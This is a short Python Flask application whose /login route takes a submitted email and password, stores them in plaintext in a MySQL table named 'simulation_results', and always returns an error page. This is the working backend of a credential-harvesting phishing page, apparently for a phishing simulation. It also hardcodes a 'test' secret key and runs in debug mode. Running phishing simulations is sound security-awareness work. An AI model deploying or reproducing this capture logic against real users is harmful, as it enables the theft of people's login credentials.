from flask import Flask, request, render_template
from settings import FOLDER_PATH, DB_NAME, USER_NAME, PASSWORD, HOST
import mysql.connector

app = Flask(__name__, template_folder=FOLDER_PATH)
app.secret_key = 'test'

# MySQL connection
def get_db_connection():
    return mysql.connector.connect(
        host=HOST,
        user=USER_NAME,
        password=PASSWORD,
        database=DB_NAME
    )

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            query = "INSERT INTO simulation_results (email, password) VALUES (%s, %s)"
            cursor.execute(query, (email, password))
            conn.commit()
        except Exception as e:
            print(f"Database Error: {e}")
        
        # Return error page
        return render_template("error.html")
    
    return render_template("login.html")

if __name__ == "__main__":
    app.run(debug=True, port=5500)
